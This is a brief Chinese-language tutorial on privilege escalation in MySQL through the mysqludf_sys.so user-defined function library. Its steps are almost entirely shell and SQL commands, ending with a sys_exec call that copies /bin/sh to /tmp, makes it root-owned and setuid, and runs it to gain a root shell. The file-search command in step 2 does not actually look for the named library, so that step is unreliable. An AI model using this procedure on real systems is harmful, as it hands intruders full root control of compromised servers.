# 基于mysqludf_sys.so漏洞的提权

有时候目标机里会存在mysqludf_sys.so文件，那即表示数据库里可能存在用户自定义的功能函数。
UDF (user defined function)，即用户自定义函数。是通过添加新函数，对MySQL的功能进行扩充，其实就像使用本地MySQL函数如 user() 或 concat() 等。

## 操作
### 1.判断目标机是否运行mysql
```
ps aux | grep mysql
```
若回显的内容中有mysqld，则表示在运行mysql

### 2.判断目标机中是否存在mysqludf_sys.so文件
```
find / -perm -0002 -type f 2>/dev/null | grep -v 'proc'
```
若回显存在则证明存在

### 3.想办法以root用户登录mysql，这里的root是mysql里的用户，不是shell的用户。
```
mysql -u root -p
```
输入root的密码登录mysql

### 4.来到mysqludf_sys.so存在的table下
```
show databases;
use mysql;　　一般在此目录下
show tables;
select * from func;　　一般在此目录下
```

### 5.利用其存在的function提权
```
select sys_exec('cp /bin/sh /tmp/shell;chown root /tmp/shell;chgrp root /tmp/shell;chmod u+s /tmp/shell');
\! /tmp/shell
```
将/bin/sh移动到/tmp下并取名为shell，然后改变/tmp/shell的拥有者、所属的组、文件权限。

\! /tmp/shell是在mysql下执行shell，\! 后面可以接其他的shell语句

之后即为root用户
